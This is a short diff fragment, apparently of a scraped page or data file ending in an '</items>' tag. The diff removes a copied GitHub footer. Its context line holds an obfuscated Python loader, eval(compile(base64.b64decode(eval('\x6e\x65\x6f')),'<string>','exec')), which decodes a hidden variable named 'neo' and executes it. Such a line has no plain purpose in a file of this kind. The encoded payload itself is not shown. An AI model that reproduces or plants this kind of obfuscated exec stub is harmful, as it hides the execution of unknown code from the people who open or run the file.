@@ -95,9 +95,4 @@ eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))
 
 
 </items>
-© 2021 GitHub, Inc.
-Terms
-Privacy
-Security
-Status
-Docs
+
